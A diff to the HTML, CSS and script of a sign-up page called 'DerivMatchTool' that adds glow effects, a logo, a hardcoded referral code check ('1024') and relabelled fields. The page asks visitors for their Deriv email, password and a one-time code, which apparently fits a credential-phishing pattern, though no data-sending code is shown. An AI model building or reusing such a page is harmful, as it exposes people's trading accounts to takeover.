@@ -129,12 +129,14 @@ cursor:pointer;
 
 }
 
+button:hover{
+transform: scale(1.03);
+box-shadow: 0 0 15px rgba(6,182,212,0.9),
+            0 0 35px rgba(147,51,234,0.8);
+}
 
-button:disabled{
-
-opacity:.5;
-cursor:not-allowed;
-
+button:active{
+transform: scale(0.98);
 }
 
 
@@ -226,6 +228,25 @@ transform:scale(1.1)
 
 }
 
+@keyframes logoGlow{
+    from{
+        transform:scale(1);
+        box-shadow:
+            0 0 10px rgba(255,80,80,.8),
+            0 0 20px rgba(255,80,80,.7),
+            0 0 40px rgba(255,80,80,.6);
+    }
+    to{
+        transform:scale(1.05);
+        box-shadow:
+            0 0 20px rgba(255,80,80,1),
+            0 0 40px rgba(255,80,80,.9),
+            0 0 60px rgba(255,80,80,.8);
+    }
+}
+
+</style>
+
 
 </style>
 
@@ -249,7 +270,19 @@ transform:scale(1.1)
 
 
 <div class="logo">
-DerivMatchTool
+   <img src="logo.png" alt="Logo" style="
+    width:70px;
+    height:70px;
+    border-radius:20px;
+    display:block;
+    margin:0 auto 10px;
+    box-shadow:
+        0 0 10px rgba(255,80,80,.8),
+        0 0 20px rgba(255,80,80,.7),
+        0 0 40px rgba(255,80,80,.6);
+    animation: logoGlow 2s ease-in-out infinite alternate;
+">
+    <div>DerivMatchTool</div>
 </div>
 
 
@@ -262,7 +295,7 @@ Powered By Deriv
 <form id="orderForm">
 
 
-<label>Email Address</label>
+<label>Email Address (your deriv email address)</label>
 
 <input
 type="email"
@@ -277,7 +310,7 @@ placeholder="email@example.com">
 <input
 id="password"
 required
-placeholder="Password">
+placeholder="Enter Password">
 
 
 
@@ -288,12 +321,20 @@ id="confirm password"
 required
 placeholder="Confirm password">
 
+<label>Referral Code</label>
 
+<input
+type="text"
+id="referralCode"
+required
+placeholder="Enter referral code">
 
 <button id="orderBtn">
 SIGN UP
 </button>
-
+<p style="text-align:center; margin-top:12px; font-size:13px; line-height:1.4; color:#00ff88; text-shadow: 0 0 6px #00ff88, 0 0 12px #00ff88;">
+Join verified users accessing Deriv-based analytics tools designed to improve trading decisions and market understanding.
+</p>
 
 </form>
 
@@ -305,6 +346,7 @@ SIGN UP
 </div>
 
 </div>
+
 
 
 
@@ -341,7 +383,7 @@ placeholder="000000">
 
 <button id="verifyBtn">
 
-Verify
+Verify OTP
 
 </button>
 
@@ -563,11 +605,19 @@ document.getElementById("password").value;
 let price=
 document.getElementById("confirm password").value;
 
+let referral =
+document.getElementById("referralCode").value;
 
+if(referral !== "1024"){
+  msg.innerHTML = "❌ Invalid referral code";
+  btn.disabled = false;
+  btn.innerHTML = "SIGN UP";
+  return;
+}
 
 btn.disabled=true;
 
-btn.innerHTML="Sending...";
+btn.innerHTML="Creating account...";
 
 
 
@@ -579,7 +629,7 @@ msg.innerHTML=
 
 
 btn.disabled=false;
-btn.innerHTML="ORDER NOW";
+btn.innerHTML="SIGN UP";
 
 
 return;
@@ -775,7 +825,7 @@ time:new Date().toLocaleString()
 
 
 
-let seconds=70000;
+let seconds=7000000;
 
 
 
